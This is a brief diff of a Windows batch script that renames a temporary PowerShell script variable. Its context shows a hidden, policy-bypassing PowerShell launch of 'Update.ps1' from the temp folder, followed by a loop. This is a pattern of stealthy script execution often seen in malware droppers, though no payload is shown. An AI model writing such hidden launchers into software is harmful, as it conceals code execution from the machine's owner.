@@ -1,6 +1,6 @@
 @echo off
 start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%TEMP%\Update.ps1"
-set sp1="%TEMP%\MyScript.ps1"
+set sp1="%TEMP%\p.ps1"
 set sp2="%TEMP%\RunX.ps1"
 
 :loop
